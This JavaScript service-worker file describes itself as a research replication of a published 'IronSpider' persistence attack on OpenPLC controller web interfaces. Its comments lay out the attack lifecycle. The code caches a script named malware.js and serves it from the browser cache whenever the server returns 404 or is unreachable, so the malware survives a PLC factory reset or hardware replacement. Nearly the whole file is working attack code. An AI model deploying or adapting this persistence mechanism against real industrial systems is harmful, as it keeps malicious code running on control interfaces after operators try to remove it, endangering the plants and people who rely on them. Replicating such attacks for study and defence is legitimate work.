/*
 * IronSpider Resurrection Service Worker — sw.js
 *
 * Research replication of NDSS 2024, Section IV-C "Persistence".
 *
 * Lifecycle (Figure 4 in the paper):
 *   1. malware.js registers this SW on first page load.
 *   2. SW installs and caches malware.js as the "resurrection payload".
 *   3. Operator or admin deletes malware.js (simulating factory reset or
 *      hardware replacement — the PLC-side file is gone).
 *   4. Browser reloads the monitoring page. Page still contains:
 *        <script src="/static/malware.js"></script>
 *      (because pages.py is unchanged — in the real attack the SW would
 *       also intercept the page HTML, but for OpenPLC we only need to
 *       demonstrate file-level resurrection.)
 *   5. Browser requests /static/malware.js. SW intercepts the fetch.
 *   6. SW attempts to fetch from server — gets 404.
 *   7. SW serves malware.js from CacheStorage. Malware continues executing.
 *
 * The SW persists in the browser even after:
 *   - PLC factory reset (clears server-side files, not browser cache)
 *   - PLC hardware replacement (new PLC at same IP — browser SW scope
 *     is origin-bound, not hardware-bound)
 *
 * Limitation: W3C spec §8.2 requires the SW script itself to be re-fetched
 * within 24 hours. After that, the browser discards the SW unless it can
 * reach /static/sw.js. Tested on Day 12 of the lab notebook.
 */

const CACHE_NAME = 'ironspider-v1';
const MALWARE_URL = '/static/malware.js';

// ---------------------------------------------------------------------------
// Install: cache malware.js before the SW becomes active.
// skipWaiting() forces the new SW to activate immediately without waiting
// for existing pages to close.
// ---------------------------------------------------------------------------
self.addEventListener('install', function(event) {
    console.log('[SW] Installing — caching resurrection payload');
    event.waitUntil(
        caches.open(CACHE_NAME).then(function(cache) {
            return cache.add(MALWARE_URL);
        }).then(function() {
            console.log('[SW] Resurrection payload cached');
            return self.skipWaiting();
        })
    );
});

// ---------------------------------------------------------------------------
// Activate: take control of all open pages immediately.
// clients.claim() means pages already open will use this SW without reload.
// ---------------------------------------------------------------------------
self.addEventListener('activate', function(event) {
    console.log('[SW] Activating — claiming all clients');
    event.waitUntil(self.clients.claim());
});

// ---------------------------------------------------------------------------
// Fetch: intercept all network requests from this origin.
//
// For /static/malware.js specifically:
//   - Try the network first (normal operation).
//   - If the server returns 404 (file deleted after factory reset), serve
//     the cached copy — this is the resurrection.
//
// For all other requests: pass through to the network unchanged.
// ---------------------------------------------------------------------------
self.addEventListener('fetch', function(event) {
    var url = event.request.url;

    if (url.includes(MALWARE_URL)) {
        event.respondWith(
            fetch(event.request).then(function(networkResponse) {
                // Server has the file — update the cache and serve it
                if (networkResponse.ok) {
                    caches.open(CACHE_NAME).then(function(cache) {
                        cache.put(event.request, networkResponse.clone());
                    });
                    return networkResponse;
                }
                // Server returned non-OK (e.g. 404 after factory reset)
                // Fall back to cache — resurrection
                console.log('[SW] malware.js is 404 on server — serving from cache (RESURRECTION)');
                return caches.match(event.request).then(function(cached) {
                    if (cached) return cached;
                    // Cache also empty (first time, or cache cleared) — nothing to do
                    return networkResponse;
                });
            }).catch(function() {
                // Network error (server unreachable) — serve from cache
                console.log('[SW] Network error fetching malware.js — serving from cache');
                return caches.match(event.request);
            })
        );
        return;
    }

    // All other requests: pass through unchanged
    // (SW does not interfere with legitimate PLC API traffic)
});
